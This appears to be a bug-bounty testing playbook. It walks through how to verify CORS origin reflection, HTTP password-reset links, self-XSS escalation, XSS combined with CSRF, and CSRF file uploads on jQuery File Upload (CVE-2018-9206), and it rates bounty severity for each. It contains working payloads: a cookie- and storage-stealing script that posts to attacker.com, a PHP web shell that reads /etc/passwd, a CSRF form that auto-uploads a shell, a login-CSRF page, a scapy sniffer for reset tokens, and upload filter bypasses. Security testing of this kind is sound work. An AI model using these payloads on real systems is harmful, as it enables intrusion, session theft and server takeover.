# CORS Manual Verification Guide

## What We Find
Scanner detected CORS headers on endpoint:
- `Access-Control-Allow-Origin` present
- `Access-Control-Allow-Credentials` detected
- Origin reflection suspected

## What We Do

**Step 1: Confirm Origin Reflection**
```bash
curl -H "Origin: https://evil.com" [ENDPOINT]
# Look for: Access-Control-Allow-Origin: https://evil.com
```

**Step 2: Verify Credentials Enabled**
```bash
curl -H "Origin: https://attacker.com" [ENDPOINT] | grep -i credentials
# Critical: Access-Control-Allow-Credentials: true
```

**Step 3: Test with Authentication**
```bash
curl -H "Origin: https://evil.com" -H "Cookie: [SESSION]" [ENDPOINT]
# Check if sensitive data returned
```

**Step 4: Quick PoC**
```html
<script>
fetch('[ENDPOINT]', {credentials: 'include'})
.then(r => r.text())
.then(data => console.log(data));
</script>
```

## What Is The Impact

**Critical (High Bounty):**
- Admin endpoints + credentials enabled
- User PII extraction possible
- Account takeover vectors

**Medium (Moderate Bounty):**
- Information disclosure only
- Public API data accessible

**Low (Limited Bounty):**
- No credentials enabled
- Non-sensitive data only

### Quick Classification:
- Origin reflection + credentials + sensitive data = **CRITICAL**
- Origin reflection + credentials + public data = **MEDIUM**  
- Origin reflection without credentials = **LOW**

# HTTP Password Reset Manual Verification Guide

## What We Find
Scanner detected password reset functionality:
- Password reset endpoints discovered  
- Email-based reset mechanism present
- Potential insecure link generation

## What We Do

**Step 1: Trigger Password Reset**
```bash
# Request password reset via application
curl -X POST [RESET_ENDPOINT] -d "email=test@yourdomain.com"
```

**Step 2: Intercept Email Generation**
```bash
# Monitor email traffic or check email directly
# Look for reset link protocol in email source
```

**Step 3: Verify Link Protocol**
```bash
# Check if reset link starts with HTTP
grep -i "http://" [EMAIL_CONTENT]
# Critical: Password reset link using HTTP protocol
```

**Step 4: Test Network Interception**
```bash
# Verify if token exposed in clear text
curl -v "http://target.com/reset_password?token=RESET_TOKEN"
# Monitor with Wireshark on test network
```

**Step 5: Check Security Headers**
```bash
curl -I [TARGET_DOMAIN] | grep -i "strict-transport"
# Missing HSTS indicates broader HTTPS enforcement issues
```

## What Is The Impact

**Critical (High Bounty):**
- Account takeover via network interception
- Reset tokens transmitted in clear text
- MITM attacks on public networks possible

**Medium (Moderate Bounty):**
- HTTPS redirect present but initial request vulnerable
- Limited network exposure scenarios

**Low (Limited Impact):**
- Application uses HTTPS throughout
- Proper HSTS implementation detected

### Quick Classification:
- HTTP reset links + no HSTS = **CRITICAL**
- HTTP with redirect + missing headers = **MEDIUM**
- HTTPS enforcement + proper headers = **NO ISSUE**

### Network Interception Test:
```python
# Proof of concept for testing environments
import scapy
from scapy.all import sniff, TCP

def capture_reset_token(packet):
    if "reset_password" in str(packet.payload):
        print(f"Token intercepted: {packet.payload}")

# Monitor HTTP traffic for reset tokens
sniff(filter="tcp port 80", prn=capture_reset_token)
```

# Self-XSS Escalation Manual Verification Guide

## What We Find
Scanner detected potential XSS in user inputs:
- User profile/settings forms with reflection
- Login page with user data display
- Self-modifiable fields (firstname, lastname, bio)
- WAF protection potentially blocking payloads

## What We Do

**Step 1: Confirm Self-XSS**
```bash
# Test basic HTML injection in profile fields
curl -X POST [PROFILE_ENDPOINT] -d "firstname=<em>test</em>" -H "Cookie: [SESSION]"
# Check if HTML renders on any page
```

**Step 2: Identify Reflection Points**
```bash
# Find where modified data appears
curl [LOGIN_PAGE] -H "Cookie: [SESSION]" | grep -i "<em>test</em>"
# Check: login page, dashboard, account pages
```

**Step 3: WAF Bypass via Origin Discovery**
```bash
# Find origin IP using DNS history
curl "https://viewdns.info/iphistory/?domain=[TARGET]"
# Test direct IP access
curl -H "Host: target.com" http://[ORIGIN_IP]/login
```

**Step 4: Escalate via Login CSRF**
```bash
# Check login CSRF protection
curl [LOGIN_PAGE] | grep -i "csrf"
# Test token reuse from different session
curl -X POST [LOGIN_ENDPOINT] -d "username=attacker&password=pass&csrf_token=[REUSED_TOKEN]"
```

**Step 5: Chain Exploitation**
```php
<?php
// PoC: Auto-login victim to attacker account
$html = file_get_contents('https://target.com/login');
preg_match('/name=\"csrf_token\" value=\"(.*?)\"/', $html, $match);
if(count($match)){
    $token = $match[1];
    echo '<form name="loginForm" target="_blank" action="https://target.com/login" method="post">
    <input type="hidden" name="username" value="attacker_account">
    <input type="hidden" name="password" value="attacker_pass">
    <input type="hidden" name="csrf_token" value="'.$token.'">
    <input type="hidden" name="remember_me" value="1">
    </form>
    <script>document.forms.loginForm.submit();</script>';
}
?>
```

## What Is The Impact

**Critical (High Bounty):**
- Stored XSS executing on victim browsers
- Account takeover via forced login + XSS
- Session hijacking through malicious JavaScript

**Medium (Moderate Bounty):**
- Self-XSS with limited escalation paths
- CSRF allowing forced login only

**Low (Limited Impact):**
- Self-XSS with no escalation vector
- WAF blocking all meaningful payloads

### Escalation Chain Indicators:
- Self-XSS + Login CSRF = **CRITICAL**
- Self-XSS + WAF bypass = **HIGH**
- Isolated self-XSS = **LOW/REJECTED**

### Key Escalation Vectors:
1. **Login CSRF**: Force victim login to attacker account
2. **Password Reset**: XSS in reset forms affecting other users  
3. **Admin Panel**: Self-XSS visible to administrators
4. **Shared Accounts**: Corporate/team account scenarios
5. **Social Engineering**: Trick users into specific actions

# XSS + CSRF Escalation Manual Verification Guide

## What We Find
Scanner detected XSS in form inputs:
- Group creation, post creation, or user-generated content
- Self-XSS confirmed in input fields
- Potential dialog boxes or confirmation messages
- Form submission endpoints discovered

## What We Do

**Step 1: Confirm Self-XSS Location**
```bash
# Test XSS payload in target field
curl -X POST [CREATE_ENDPOINT] -d "group_name=<script>alert(1)</script>" -H "Cookie: [SESSION]"
# Identify exact reflection point: dialog, confirmation, or display page
```

**Step 2: Map XSS Reflection Points**
```bash
# Check where payload appears
curl [GROUP_LIST_PAGE] -H "Cookie: [SESSION]" | grep "alert(1)"
curl [DIALOG_ENDPOINT] -H "Cookie: [SESSION]" | grep "alert(1)"
# Document: encoded vs unencoded locations
```

**Step 3: Test CSRF Protection**
```bash
# Capture group creation request
curl -X POST [CREATE_ENDPOINT] \
  -d "group_name=TestGroup&description=Test" \
  -H "Cookie: [SESSION]" \
  --proxy 127.0.0.1:8080

# Test without CSRF token
curl -X POST [CREATE_ENDPOINT] \
  -d "group_name=TestGroup2&description=Test2" \
  -H "Referer: https://attacker.com"
```

**Step 4: Validate Cross-Origin Requests**
```bash
# Test from different origin
curl -X POST [CREATE_ENDPOINT] \
  -d "group_name=<script>alert('CSRF-XSS')</script>" \
  -H "Origin: https://attacker.com" \
  -H "Referer: https://attacker.com"
```

**Step 5: Build Exploitation Chain**
```html
<!-- PoC: Force victim to create group with XSS payload -->
<form id="maliciousForm" action="https://target.com/create-group" method="POST">
    <input type="hidden" name="group_name" value="<script>alert('Account Compromised')</script>">
    <input type="hidden" name="description" value="Malicious Group">
    <input type="hidden" name="privacy" value="public">
</form>
<script>
    document.getElementById('maliciousForm').submit();
</script>
```

**Step 6: Advanced Payload Testing**
```javascript
// Test for DOM-based execution timing
<script>
    // Steal session tokens
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({
            'cookies': document.cookie,
            'sessionStorage': localStorage.getItem('session'),
            'origin': window.location.origin
        })
    });
</script>
```

## What Is The Impact

**Critical (High Bounty):**
- Stored XSS affecting multiple users via CSRF
- Session hijacking through forced actions
- Account takeover via malicious group creation

**High (Good Bounty):**
- Self-XSS escalated to affect other users
- One-time execution with significant impact
- Administrative privilege escalation possible

**Medium (Moderate Bounty):**
- Limited XSS execution scope
- CSRF present but minimal impact
- Temporary dialog-based execution only

**Low (Limited Impact):**
- Self-XSS with no escalation vector
- CSRF protection prevents exploitation
- Encoded output prevents execution

### Escalation Success Indicators:
- Self-XSS + No CSRF protection = **HIGH/CRITICAL**
- Dialog XSS + Forced creation = **HIGH**
- Persistent group XSS + CSRF = **CRITICAL**
- Isolated self-XSS = **REJECTED**

### Advanced Exploitation Vectors:
1. **Administrative Panels**: Force admin to create malicious content
2. **Bulk Operations**: CSRF to create multiple XSS vectors
3. **Social Engineering**: Trick users into specific group interactions
4. **Privilege Escalation**: Force creation of admin-accessible content
5. **Data Exfiltration**: XSS payload that steals sensitive information

### Technical Validation Checklist:
- [ ] XSS executes in victim's browser context
- [ ] CSRF bypasses same-origin policy restrictions  
- [ ] Payload persists beyond initial creation
- [ ] Impact affects users other than attacker
- [ ] Exploitation requires minimal user interaction

# File Upload + CSRF Manual Verification Guide

## What We Find
Scanner detected file upload functionality:
- jQuery File Upload plugin signatures
- Upload endpoints in source code analysis
- Potential unrestricted file upload paths
- Missing CSRF protection on upload forms

## What We Do

**Step 1: Identify Upload Plugin Signatures**
```bash
# Search for jQuery File Upload patterns in source
curl [TARGET] | grep -i "jquery.*file.*upload"
curl [TARGET] | grep -E "server/php|upload\.php|fileupload"
# Common paths: /plugins/jQuery-file-upload/server/php/
```

**Step 2: Map Upload Endpoints**
```bash
# Test common upload paths
curl -I [TARGET]/upload.php
curl -I [TARGET]/fileupload/
curl -I [TARGET]/plugins/jQuery-file-upload/server/php/
# Look for 200 responses or {"files":[]} output
```

**Step 3: Test File Upload Restrictions**
```bash
# Test malicious file upload
curl -X POST [UPLOAD_ENDPOINT] \
  -F "files[]=@malicious.php" \
  -H "Cookie: [SESSION]"
# Check response for file acceptance/rejection
```

**Step 4: Validate CSRF Protection**
```bash
# Test upload without CSRF token
curl -X POST [UPLOAD_ENDPOINT] \
  -F "files[]=@test.txt" \
  -H "Origin: https://attacker.com" \
  -H "Referer: https://attacker.com"
```

**Step 5: Construct CSRF Upload Attack**
```html
<!-- Malicious auto-upload form -->
<form id="uploadForm" action="https://target.com/upload.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="files[]" id="fileInput">
</form>
<script>
// Create malicious PHP file
const fileContent = '<?php system($_GET["cmd"]); ?>';
const blob = new Blob([fileContent], {type: 'application/x-php'});
const file = new File([blob], 'shell.php', {type: 'application/x-php'});

// Simulate file selection
const dataTransfer = new DataTransfer();
dataTransfer.items.add(file);
document.getElementById('fileInput').files = dataTransfer.files;

// Auto-submit form
document.getElementById('uploadForm').submit();
</script>
```

**Step 6: Advanced Payload Testing**
```php
<?php
// Web shell payload for testing
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
// Information disclosure
phpinfo();
// File system access
echo file_get_contents('/etc/passwd');
?>
```

**Step 7: Extension Bypass Techniques**
```bash
# Test various bypass methods
curl -X POST [UPLOAD_ENDPOINT] -F "files[]=@shell.php.jpg"
curl -X POST [UPLOAD_ENDPOINT] -F "files[]=@shell.phtml"  
curl -X POST [UPLOAD_ENDPOINT] -F "files[]=@shell.php%00.jpg"
curl -X POST [UPLOAD_ENDPOINT] -F "files[]=@shell.php.."
```

## What Is The Impact

**Critical (High Bounty):**
- Remote Code Execution via PHP/script upload
- Server compromise through web shell deployment
- Network-wide impact across subdomains
- Complete system takeover potential

**High (Good Bounty):**
- Arbitrary file upload with execution blocked
- Malicious file hosting capabilities
- Cross-domain file upload via CSRF
- CVE-2018-9206 exploitation confirmed

**Medium (Moderate Bounty):**
- File upload with strict execution prevention
- Limited file type acceptance
- CSRF protection partially implemented

**Low (Limited Impact):**
- Restricted file uploads only
- Strong CSRF protection present
- Server-side validation blocking malicious files

### Systematic Assessment Framework:

**Technical Validation Checklist:**
- [ ] Arbitrary file type acceptance confirmed
- [ ] CSRF protection absent or bypassable
- [ ] File execution capability verified
- [ ] Multi-subdomain attack surface mapped
- [ ] Impact scope extends beyond single application

**Exploitation Escalation Vectors:**
1. **Web Shell Deployment**: Direct server access via uploaded scripts
2. **Cross-Domain Attacks**: CSRF enabling network-wide file injection
3. **Privilege Escalation**: Uploaded files accessing sensitive server resources
4. **Data Exfiltration**: Malicious scripts harvesting confidential information
5. **Persistent Access**: Backdoor establishment through unrestricted uploads

### Advanced Testing Methodology:
```python
def validate_upload_vulnerability(endpoint):
    """Comprehensive file upload security assessment"""
    test_files = [
        {'name': 'shell.php', 'content': '<?php system($_GET["cmd"]); ?>'},
        {'name': 'shell.phtml', 'content': '<?php phpinfo(); ?>'},
        {'name': 'shell.php.jpg', 'content': '<?php echo "bypass"; ?>'}
    ]
    
    results = []
    for test_file in test_files:
        response = upload_file_csrf(endpoint, test_file)
        if response.status_code == 200:
            results.append({
                'file': test_file['name'],
                'uploaded': True,
                'execution_test': test_file_execution(response.url)
            })
    
    return results
```

### CVE-2018-9206 Specific Indicators:
- Response pattern: `{"files":[]}`
- Parameter name: `files[]`  
- No file type validation present
- Direct PHP execution capability
- Cross-origin request acceptance